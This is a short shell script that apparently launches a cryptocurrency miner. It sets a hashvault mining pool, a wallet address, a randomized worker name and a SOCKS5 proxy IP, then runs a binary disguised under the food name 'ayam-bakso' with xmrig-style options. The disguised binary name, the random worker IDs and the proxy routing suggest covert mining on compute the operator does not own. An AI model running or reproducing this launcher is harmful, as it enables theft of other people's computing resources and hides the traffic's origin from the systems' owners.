POL=pool.hashvault.pro:80
WAL=TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2
WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
PRO=socks5://174.77.111.196:4145
chmod 777 ayam-bakso && ./ayam-bakso -o $POL -u $WAL --keepalive --donate-level 1 -p $WOR -k --tls $PRO